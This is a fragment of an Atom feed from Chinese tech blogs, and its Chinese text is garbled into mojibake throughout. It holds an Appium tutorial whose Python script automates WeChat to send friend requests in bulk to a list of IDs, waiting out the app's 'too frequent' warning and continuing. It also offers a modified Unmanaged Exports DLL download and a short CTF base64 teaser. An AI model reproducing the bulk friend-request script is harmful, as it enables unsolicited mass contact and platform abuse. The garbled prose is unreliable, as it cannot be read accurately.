<p>Êü•ËØ¢ÂáΩÊï∞ËøîÂõûÁöÑÂÖÉÁ¥†ÂØπË±°ÂèØ‰ª•ÂÉèJS‰∏≠ÁöÑdomÂÖÉÁ¥†‰∏ÄÊ†∑ÔºåÁªßÁª≠‰ΩøÁî®Êü•ËØ¢ÂáΩÊï∞Êù•ÈÄâÂÆöÂÖ∂Â≠êÂÖÉÁ¥†„ÄÇÁî®‰æãÂ¶Ç‰∏ã„ÄÇ</p>
<pre class="lang:python decode:true">search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
search.click()</pre>
<h2>Â¶Ç‰ΩïÁ°ÆÂÆöÊü•ËØ¢ËßÑÂàô</h2>
<p>‰∫ÜËß£‰∫ÜÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞ÂêéÔºå‰∏ãÈù¢Â∞±Â∫îÂØπUIËøõË°åÂÆö‰Ωç‰∫Ü„ÄÇÂ¶ÇÊûúÊòØËá™Â∑±Âõ¢ÈòüÂºÄÂèëÁöÑÁ®ãÂ∫èÔºåÊé®ËçêËÆ©ÂºÄÂèëÂêåÂ≠¶Âú®ÊâÄÊúâÁöÑÁ©∫Èó¥‰∏äÈÉΩÊ∑ªÂä†resource_idËøõË°åÁªùÂØπÂÆö‰Ωç„ÄÇÂ¶ÇÊûúÁ¢∞Âà∞Ê≤°ÊúâË∞à‰ª∑resource_idÁöÑÂÖÉÁ¥†ÔºåÈÇ£Â∞±Ë¶Å‰ΩøÁî®Âà´ÁöÑÂäûÊ≥ïËøõË°åÂÆö‰Ωç‰∫Ü„ÄÇ</p>
<h3>1. UI Automator Viewer</h3>
<p>UI Automator ViewerÊòØAndroidÂÆòÊñπÁöÑUIÂÆö‰ΩçÂ∑•ÂÖ∑Ôºå‰Ωç‰∫ésdk/tools‰∏ã„ÄÇËøêË°åÂêé‰ºöÊâìÂºÄviewerÁïåÈù¢„ÄÇÁÇπÂáªËé∑ÂèñÊåâÈíÆÂç≥ÂèØËé∑ÂèñÂΩìÂâçÊ≠£Âú®ËøêË°åÁöÑActivityÁöÑUIÁªìÊûÑ„ÄÇ</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png"><img class="alignnone size-medium wp-image-104" src="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png" alt="uiviewer" width="300" height="225" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-768x576.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-1024x768.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png 1600w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<h3>2. AppiumDriver getPageSource</h3>
<p>AppiumDriver(Client) ÂèØ‰ª•ÂæàÊñπ‰æøÁöÑËé∑ÂæóÂΩìÂâçÊ≠£Âú®ËøêË°åÁöÑActivityÁöÑUIÊèèËø∞ÔºåÈöèÂêéÂèØÊ†πÊçÆËøîÂõûÁöÑXMLÊñáÊ°£Êù•ÂØªÊâæÂÖÉÁ¥†„ÄÇ</p>
<pre class="lang:python decode:true">print dr.page_source</pre>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg"><img class="alignnone size-medium wp-image-108" src="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg" alt="getSource" width="300" height="178" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-768x456.jpg 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-1024x608.jpg 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg 1261w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>(ÂõæÁâá‰∏é‰ªñ‰∫∫Ôºå‰æµÂà†)</p>
<p>Á°ÆÂÆöÂÖÉÁ¥†‰ΩçÁΩÆÂêéÔºåÂç≥ÂèØÊ†πÊçÆÂâçËø∞ÁöÑFindÊñπÊ≥ïÊù•Êü•Êâæ/ÈÄâÊã©ÂÖÉÁ¥†</p>
<h2>ÁºñÂÜôÂÆåÊï¥ÁöÑÊµãËØï‰ª£Á†Å</h2>
<p>Ê≠£Á°ÆÁöÑËé∑ÂèñÂÖÉÁ¥†‰πãÂêé‰æøÂèØ‰ª•Ëé∑ÂèñÂÖÉÁ¥†Áõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØÔºåÈöèÂêé‰ΩøÁî®ÂêÑËØ≠Ë®ÄÂ∏∏Áî®ÁöÑÊµãËØïÊ°ÜÊû∂ÁºñÂÜôÊµãËØïÂç≥ÂèØÔºåÂ¶ÇJavaÁöÑJUnitÔºåNodejsÁöÑMochaÁ≠â„ÄÇ</p>
<p>ËøôÈáåÊàë‰ΩøÁî®Appium‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÊ®°ÊãüÁî®Êà∑ÁÇπÂáªÊ∑ªÂä†ÂæÆ‰ø°Â•ΩÂèãÔºåÊâÄ‰ª•ÂÆåÊï¥ÁöÑÁ®ãÂ∫èÂπ∂Ê≤°Êúâ‰ΩøÁî®Âà∞ÊµãËØïÊ°ÜÊû∂„ÄÇÁõ∏ÂÖ≥ÁöÑUIÂÖÉÁ¥†Ëé∑Âèñ/Êìç‰ΩúÊñπÊ≥ï‰æõÂ§ßÂÆ∂ÂèÇËÄÉ„ÄÇ</p>
<pre class="lang:python decode:true "># coding:utf-8
from appium import webdriver
from time import sleep


def addFriend(dr, id, dryRun=False):
    succ = False
    wechatId = str(id)
    dr.find_element_by_accessibility_id(r"Êõ¥Â§öÂäüËÉΩÊåâÈíÆ").click()
    item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[2].click()
    except:
        print "Error! in item list len"
        return succ
    el = dr.find_element_by_class_name("android.widget.ListView")
    item_list = el.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[1].click()
    except:
        print "Error! in item list len"
        return succ
    t = dr.find_element_by_id("com.tencent.mm:id/f7")
    t.send_keys(wechatId)
    search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
    search.click()
    try:
        freq = dr.find_element_by_id('com.tencent.mm:id/aqq')
        assert freq.text == u"Êìç‰ΩúËøá‰∫éÈ¢ëÁπÅÔºåËØ∑Á®çÂêéÂÜçËØï„ÄÇ"
        print "Frequency too high! Sleep 300s"
        sleep(60)
        return succ
    except:
        pass

    try:
        dr.find_element_by_id('com.tencent.mm:id/a8x').click()
        addBtn = dr.find_element_by_id('com.tencent.mm:id/eu')
        if not dryRun:
            addBtn.click()
            succ = True
        print "Success Send Requests:" + wechatId
    except:
        print "No Such User Or Already a Friend:" + wechatId

    while True:
        try:
            dr.find_element_by_id('com.tencent.mm:id/fb').click()
        except:
            try:
                dr.find_element_by_id('com.tencent.mm:id/f4').click()
            except:
                break
    return True

def resetActivity(dr, desired_caps):
    dr.start_activity(desired_caps['appPackage'], desired_caps['appActivity'])

desired_caps = {}
desired_caps['platformName'] = 'Android'
desired_caps['platformVersion'] = '5.1'
desired_caps['deviceName'] = 'm3_note'
desired_caps['appPackage'] = 'com.tencent.mm'
desired_caps['appActivity'] = '.ui.LauncherUI'
print "Trying connect to phone..."
dr = {}
try:
    dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps)
except Exception, e:
    print "Cannot Connect to phone :", e
    exit()
print "Successfully connect to phone."
print "Reading friend list..."
friendList = []
fp = open("friends.txt")
line = fp.readline().strip()
while line:
    friendList.append(line)
    line = fp.readline().strip()
print "Finish reading friends. Total: " + str(len(friendList))
print "Wait for Wechat's splash screen...."
for i in range(0, 10):
    print 10 - i
    sleep(1)
succ_list = []
fail_list = []
for i in friendList:
    try:
        succ = addFriend(dr, i, dryRun=False)
        if succ:
            succ_list.append(i)
        else:
            fail_list.append(i)
    except:
        fail_list.append(i)
        resetActivity(dr, desired_caps)

print "Succeed List:"
print "\n".join(succ_list)
print "Failed List:"
print "\n".join(fail_list)

dr.close()</pre>
<p>&nbsp;</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/unmanaged-exports.html</id>
        <title><![CDATA[Unmanaged Exports ‰øÆÊ≠£Áâà .NETÂØºÂá∫ÈùûÊâòÁÆ°ÂáΩÊï∞]]></title>
        <updated>2016-06-19T07:05:21+08:00</updated>
        <link href="https://www.noisyfox.io/unmanaged-exports.html"/>
        <content type="text/html" src="https://www.noisyfox.io/unmanaged-exports.html"><![CDATA[<p>Unmanaged Exports ÊòØ‰∏Ä‰∏™Â∞Ü.NETÁºñÂÜôÁöÑÈùôÊÄÅÊâòÁÆ°ÂáΩÊï∞ÂØºÂá∫ÊàêÂèØ‰æõC/C++Á≠âÁõ¥Êé•Ë∞ÉÁî®ÁöÑÈùûÊâòÁÆ°ÂáΩÊï∞ÁöÑÂ∑•ÂÖ∑„ÄÇ</p>
<hr />
<h2>ÂÆÉÊòØÂ¶Ç‰ΩïÂ∑•‰ΩúÁöÑÔºü</h2>
<p>ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÊàñËÄÖ‰øÆÊîπÂ∑≤ÁªèÂ≠òÂú®ÁöÑÁ±ªÂ∫ì„ÄÇ<br />
ÁÑ∂ÂêéÂä†ÂÖ• UnmanagedExports <a href="https://nuget.org/packages/UnmanagedExports" target="_blank">Nuget ÂåÖ</a>„ÄÇ<br />
ËøôÂü∫Êú¨Â∞±ÊòØÊâÄÊúâË¶ÅÂÅöÁöÑ‰∫ãÊÉÖ‰∫Ü„ÄÇ<br />
ÁÑ∂Âêé‰Ω†Â∞±ÂèØ‰ª•Èöè‰æøÂÜô‰∏Ä‰∫õÈùôÊÄÅÊñπÊ≥ïÔºåÁî®[DllExport]Ë£ÖÈ•∞ÂÆÉÔºåÁÑ∂ÂêéÂú®ÂéüÁîü‰ª£Á†Å‰∏≠‰ΩøÁî®‰∫Ü„ÄÇ<br />
ÂÆÉÂæàÂÉè DllImportÔºå‰Ω†ÂèØ‰ª•Áî®MarshalAsAttributeÊù•ÂÆö‰πâËØ•ÂáΩÊï∞ÁöÑÂèÇÊï∞ÂíåÁªìÊûúÁöÑÊ†ºÂºè„ÄÇ<br />
Âú®ÁºñËØëÊó∂ÔºåËøô‰∏™Â∑•ÂÖ∑‰ºöËá™Âä®‰øÆÊîπIL‰ª£Á†ÅÂ¢ûÂä†ÂØºÂá∫Â£∞Êòé„ÄÇ</p>
<h2>ÈôêÂà∂</h2>
<ul>
<li>‰Ω†‰∏çËÉΩÂØºÂá∫Âú®Âêå‰∏Ä‰∏™class‰∏≠ÁöÑÈáçËΩΩÂáΩÊï∞ÔºåÂç≥‰æø‰Ω†ÊåáÂÆö‰∫Ü‰∏çÂêåÁöÑÂØºÂá∫ÂêçÁß∞„ÄÇ</li>
<li>Âè¶‰∏Ä‰∏™ÈôêÂà∂ÊòØ‰Ω†‰∏çËÉΩÈÄíÂΩíË∞ÉÁî®ÂØºÂá∫ÂáΩÊï∞„ÄÇ</li>
</ul>
<p>ËøôÁúãËµ∑Êù•ÊòØËøêË°åÊó∂ÁöÑÈôêÂà∂ÔºåÂπ∂‰∏îÊàëÂπ∂‰∏çÊÉ≥‰∏∫‰∫ÜËßÑÈÅøËøô‰∫õÈôêÂà∂ËÄåÂÜçÊää‰Ω†ÁöÑÂáΩÊï∞ÂÅö‰∏ÄÊ¨°ÂåÖË£Ö„ÄÇ</p>
<hr />
<p>È¶ñÂÖàÁî®C#ÔºàÂÖ∂ÂÆÉ.NETËØ≠Ë®Ä‰πüÂèØÔºâÂàõÂª∫‰∏Ä‰∏™windowsÁªèÂÖ∏Ê°åÈù¢dllÔºåÁÑ∂ÂêéÂú®Nuget‰∏≠ÊêúÁ¥¢Âπ∂ÂÆâË£ÖUnmanaged ExportsËøô‰∏™ÂåÖ„ÄÇ</p>
<p>ÈöèÂêéÁºñÂÜô‰Ω†Ë¶ÅÂØºÂá∫ÁöÑÈùôÊÄÅÂáΩÊï∞ÔºåÂπ∂Ê∑ªÂä†[DllExport]Ê≥®Ëß£ÔºåËåÉ‰æãÂ¶Ç‰∏ãÔºö</p>
<p><pre data-enlighter-language="csharp" class="EnlighterJSRAW">
class Test
{
  [DllExport(&quot;add&quot;, CallingConvention = CallingConvention.Cdecl)]
  public static int TestExport(int left, int right)
  {
     return left + right;
  } 
}
</pre></p>
<p>ÁÑ∂ÂêéÁîüÊàêÂπ≥Âè∞ÈÄâÊã©‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÂπ≥Âè∞Ôºà‰∏çËÉΩÊòØAnyCPUÂê¶ÂàôËØ•Â∑•ÂÖ∑‰∏çÁîüÊïàÔºâÔºåÁîüÊàêËß£ÂÜ≥ÊñπÊ°àÂç≥ÂèØ„ÄÇ<br />
ËØ•Â∑•ÂÖ∑ÊúÄÊñ∞ÁâàÂè™ÊîØÊåÅvs2008‰ª•ÂêéÁöÑvsÔºåÂõ†‰∏∫vs2008Âèä‰ª•ÂâçÁöÑÁâàÊú¨‰∏çÊîØÊåÅnuget„ÄÇ</p>
<hr />
<p>Â∑•ÂÖ∑ÂÆòÊñπÁΩëÁ´ôÂèäËØ¶ÁªÜËØ¥ÊòéÔºö<br />
<a href="https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports" target="_blank">https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports</a></p>
<hr />
<p>ÂÖ≥‰∫éÁºñËØëÈîôËØØ<br />
ËØ•Â∑•ÂÖ∑Âú®ÈùûËã±ÊñáÊìç‰ΩúÁ≥ªÁªü‰∏äÂèØËÉΩ‰ºöÂá∫Áé∞ÁºñËØëÈîôËØØÁöÑÈóÆÈ¢òÔºåÂÖ∑‰ΩìË°®Áé∞Â¶Ç‰∏ãÔºö<br />
<a href="http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports" target="_blank">http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports</a><br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQÊà™Âõæ20160619143947.png"><img class="aligncenter size-full wp-image-402" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQÊà™Âõæ20160619143947.png" alt="Unmanaged Exports ÁºñËØëÈîôËØØ" width="1452" height="90" /></a><br />
‰∏ªË¶ÅÂéüÂõ†ÊòØÂõ†‰∏∫ÈùûËã±ÊñáÊìç‰ΩúÁ≥ªÁªü‰∏≠IL‰ª£Á†Å‰∏≠Âê´ÊúâÈùûËã±ÊñáÊ≥®ÈáäÂØºËá¥Êèí‰ª∂Â∑•‰ΩúÂºÇÂ∏∏„ÄÇ<br />
ËôΩÁÑ∂Â∞ÜÁ≥ªÁªüËØ≠Ë®ÄÂàáÊç¢ÊàêËã±ÊñáÂèØ‰ª•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºå‰ΩÜÊòØËøô‰∏™ÊñπÊ≥ïËøá‰∫éÈ∫ªÁÉ¶ÔºåÊïÖÊú¨‰∫∫‰øÆÊîπ‰∫ÜËøô‰∏™Â∑•ÂÖ∑Ôºå‰øÆÊ≠£‰∫ÜÂÖ∂Âú®ÈùûËã±ÊñáÊìç‰ΩúÁ≥ªÁªü‰∏ä‰∏çËÉΩÊ≠£Â∏∏‰ΩøÁî®ÁöÑÈóÆÈ¢ò„ÄÇ</p>
<p>ÊñáÊú´ÈôÑ‰∏ä‰øÆÊîπÂêéÁöÑÊñá‰ª∂ÔºåËß£ÂéãÂêéÂ∞ÜÂÖ∂‰∏≠ÁöÑ‰∏§‰∏™dllÊõøÊç¢ËøõÈ°πÁõÆNuGetÂåÖ‰∏≠packages\UnmanagedExports.1.2.7\toolsÊñá‰ª∂Â§π‰∏ãÁöÑ‰∏§‰∏™ÂêåÂêçdllÂç≥ÂèØ„ÄÇ<br />
Êîπ‰øÆÊ≠£Áâà‰ªÖÈíàÂØπUnmanaged Exports 1.2.7ÁâàÊú¨Âà∂‰ΩúÔºåÂÖ∂ÂÆÉÁâàÊú¨Êú™ÊµãÔºåÂèØËÉΩ‰∏çËÉΩÊ≠£Â∏∏‰ΩøÁî®„ÄÇ<br />
ÊõøÊç¢ÂÆåÊàêÂêéÂç≥ÂèØÊ≠£Â∏∏ÁºñËØëÔºö<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQÊà™Âõæ20160619145913.png"><img class="aligncenter size-full wp-image-403" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQÊà™Âõæ20160619145913.png" alt="Unmanaged Exports ÁºñËØëÊ≠£Â∏∏" width="662" height="65" /></a><br />
<div class="sdm_download_item "><div class="sdm_download_item_top"><div class="sdm_download_thumbnail"></div><div class="sdm_download_title">DllExport-Fixed-1.2.7.7z</div></div><div style="clear:both;"></div><div class="sdm_download_description"><p>‰øÆÊ≠£‰∫ÜÈùûËã±ÊñáÁ≥ªÁªüÁºñËØëÈîôËØØÁöÑUnmanaged Exports 1.2.7</p>
<h1></h1>
</div><div class="sdm_download_link"><span class="sdm_download_button"><a href="https://www.noisyfox.io/?smd_process_download=1&download_id=404" class="sdm_download green" title="DllExport-Fixed-1.2.7.7z" target="_blank">Download Now!</a></span><span class="sdm_download_item_count"><span class="sdm_item_count_number">881</span><span class="sdm_item_count_string"> Downloads</span></span></div></div><div class="sdm_clear_float"></div></p>
<p><a rel="nofollow" href="https://www.noisyfox.io/unmanaged-exports.html">Unmanaged Exports ‰øÆÊ≠£Áâà .NETÂØºÂá∫ÈùûÊâòÁÆ°ÂáΩÊï∞</a>ÔºåÈ¶ñÂèë‰∫é<a rel="nofollow" href="https://www.noisyfox.io">ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù</a>„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/04/nuaactf/</id>
        <title><![CDATA[095a655fc809cbbdffa207717a5233f5ÁöÑÂéüÊñáÊòØ‰ªÄ‰πàÔºü]]></title>
        <updated>2016-04-19T02:47:11+08:00</updated>
        <link href="https://www.summershrimp.com/2016/04/nuaactf/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/04/nuaactf/"><![CDATA[<p>095a655fc809cbbdffa207717a5233f5ÁöÑÂéüÊñáÊòØ</p>
<pre class="lang:default decode:true ">bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE</pre>
<p>Happy NUAACTF!</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
</feed>